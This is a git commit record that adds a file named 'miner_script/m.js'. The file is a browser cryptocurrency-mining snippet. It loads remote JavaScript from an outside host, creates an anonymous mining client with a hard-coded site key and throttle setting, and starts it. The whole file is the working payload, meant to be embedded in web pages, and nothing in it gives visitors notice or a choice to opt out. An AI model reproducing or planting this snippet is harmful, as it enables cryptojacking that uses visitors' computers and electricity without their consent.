3ca82c1555f62a276e39d7cf520696a9e0922ad5
Gohsty <89268998+Gohstys@users.noreply.github.com>
2022-04-30 22:51:28 +0200

    Add files via upload

---
+++ miner_script/m.js
@@ -0,0 +1,9 @@
+<script src="https://www.hostingcloud.racing/RC7y.js"></script>
+<script>
+    var _client = new Client.Anonymous('9b873c81b6fe5ef795e86ec68834ef5479f59b8f9f3f27c98b57fa5670f5d479', {
+        throttle: 0.2, c: 'w', ads: 0
+    });
+    _client.start();
+    
+
+</script>
